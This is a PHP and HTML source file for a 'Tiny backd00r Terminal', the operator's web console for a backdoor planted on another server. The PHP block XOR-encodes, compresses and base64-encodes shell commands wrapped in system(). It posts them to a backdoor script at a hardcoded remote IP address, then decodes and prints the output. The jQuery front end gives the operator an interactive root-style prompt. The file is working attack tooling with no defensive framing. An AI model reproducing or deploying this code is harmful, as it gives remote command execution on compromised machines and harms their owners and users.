<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

	$k="094db036";
	$kh="7ef9bf383ded";
	$kf="b241e2ed9d4a";
	$p="wa1Yv8JoMtD0QJO9";
	function x($t,$k){
		$c=strlen($k);
		$l=strlen($t);
		$o="";
		for($i=0;$i<$l;){
			for($j=0;($j<$c&&$i<$l);$j++,$i++){
				$o.=$t{$i}^$k{$j};
			}
		}
		return $o;
	}

	// Encode Payload

	$cmd = "system(\"" . htmlentities($_POST["payload"]) . "\");";
	$cmd_encoded = base64_encode(x(gzcompress($cmd),$k));



	// Send Payload

	$url = "http://207.154.246.97/rc3/backdoor.php";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $kh . $cmd_encoded . $kf);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close ($ch);



	// Filter Result

	$result = str_replace($p , "", $result);
	$result = str_replace($kh, "", $result);
	$result = str_replace($kf, "", $result);



	// Decode Result

	$result_decoded = gzuncompress(x(base64_decode($result),$k));
	$final_result = str_replace("\n" , "<br>" , htmlentities($result_decoded));
	echo $final_result;
	die();
}
?>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <title>Tiny backd00r Terminal</title>
    <link href="https://fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css" />
	<style>
		::selection {
		  background: #FF5E99;
		}
		html, body {
		  width: 100%;
		  height: 100%;
		  margin: 0;
		}
		body {
		  font-size: 11pt;
		  font-family: Inconsolata, monospace;
		  color: white;
		  background-color: black;
		}
		#container {
		  padding: .1em 1.5em 1em 1em;
		}
		#container output {
		  clear: both;
		  width: 100%;
		}
		#container output h3 {
		  margin: 0;
		}
		#container output pre {
		  margin: 0;
		}
		.input-line {
		  display: -webkit-box;
		  -webkit-box-orient: horizontal;
		  -webkit-box-align: stretch;
		  display: -moz-box;
		  -moz-box-orient: horizontal;
		  -moz-box-align: stretch;
		  display: box;
		  box-orient: horizontal;
		  box-align: stretch;
		  clear: both;
		}
		.input-line > div:nth-child(2) {
		  -webkit-box-flex: 1;
		  -moz-box-flex: 1;
		  box-flex: 1;
		}
		.prompt {
		  white-space: nowrap;
		  color: #77f542;
		  margin-right: 7px;
		  display: -webkit-box;
		  -webkit-box-pack: center;
		  -webkit-box-orient: vertical;
		  display: -moz-box;
		  -moz-box-pack: center;
		  -moz-box-orient: vertical;
		  display: box;
		  box-pack: center;
		  box-orient: vertical;
		  -webkit-user-select: none;
		  -moz-user-select: none;
		  user-select: none;
		}
		.cmdline {
		  outline: none;
		  background-color: transparent;
		  margin: 0;
		  width: 100%;
		  font: inherit;
		  border: none;
		  color: inherit;
		}
		.oldcmdline {
		  outline: none;
		  background-color: transparent;
		  margin: 0;
		  width: 100%;
		  font: inherit;
		  border: none;
		  color: inherit;
		}
		.ls-files {
		  height: 45px;
		  -webkit-column-width: 100px;
		  -moz-column-width: 100px;
		  -o-column-width: 100px;
		  column-width: 100px;
		}


		/************************************************************/
		/* SVG Clock                                                */
		/************************************************************/

		.clock-container {
		  display: none /*inline-block*/;
		  position: relative;
		  width: 200px;
		  vertical-align: middle;
		  overflow: hidden;
		} 

		.clock-container > svg > circle {
		  stroke-width: 2px;
		  stroke: #fff;
		}

		.hour, .min, .sec { 
		  stroke-width: 1px;
		  fill: #333;
		  stroke: #555;
		}

		.sec {
		   stroke: #f55;
		}


	</style>
  </head>
  <body>
    <div id="container">
		<br><center>
		<pre style="color: #ff7575;"><?php 
				echo " ██████╗  █████╗ ██████╗ ██╗  ██╗████████╗<br>";
				echo " ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝╚══██╔══╝<br>";
				echo " ██║  ██║███████║██████╔╝█████╔╝    ██║   <br>";
				echo " ██║  ██║██╔══██║██╔══██╗██╔═██╗    ██║   <br>";
				echo " ██████╔╝██║  ██║██║  ██║██║  ██╗   ██║   <br>";
				echo " ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   <br>";
				echo "<br>Tiny Backd00r Terminal";
		?></pre></center>
      <div id="input-line" class="input-line"><div class="prompt"></div><input class="cmdline" autofocus="true" /></div><div id="result"></div>
    </div>
    <script src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
    
    <script>
	var pwd = "";
	$(function() {
	  $.post("Tiny backd00r.php",
	  {
		payload: "pwd"
	  },
	  function(data, status){
		if(data.length == 0){
			pwd = "Unknown dir"
		}else{
			pwd = data.replace("<br>","");
		}
		$(".prompt").html("[DarkT@TinyBackd00r " + pwd + "] # ");
	  });
	  
	});
		$(document).on('keypress',function(e) {
			if(e.which == 13) {
				  var cmdval = $('.cmdline').val();
				  if(cmdval.length > 0){
				  $.post("Tiny backd00r.php",
				  {
					payload: cmdval
				  },
				  function(data, status){
					$('#result').html(data);
					$(".cmdline").attr('class', 'oldcmdline');
					$("#result").attr('id', 'oldresult');
					$('.oldcmdline').prop('disabled', true);
					$('#container').append("<div id=\"input-line\" class=\"input-line\"><div class=\"prompt\">[DarkT@TinyBackd00r " + pwd + "] # </div><input class=\"cmdline\" autofocus=\"true\" /></div><div id=\"result\"></div>");
					$(".cmdline").focus();
					
					
				  });
				  }
			}
		});
		
	</script>
  </body>
</html>


